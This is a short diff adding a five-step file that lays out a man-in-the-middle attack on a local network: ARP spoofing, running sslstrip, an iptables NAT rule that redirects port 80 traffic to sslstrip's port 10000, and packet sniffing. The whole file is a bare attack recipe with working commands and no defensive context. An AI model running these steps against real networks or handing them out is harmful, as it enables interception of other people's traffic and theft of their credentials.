@@ -1,0 +1,5 @@
+1 - Run ARP Spoofing
+2 - Run sslstrip  Command = sslstrip
+3 - Run Iptables  Command = iptables -t nat -A PREROUTING -p tcp –destination-port 80 -j REDIRECT –to-port 10000
+4 - Run Packet Sniffer
+5 - Thats All
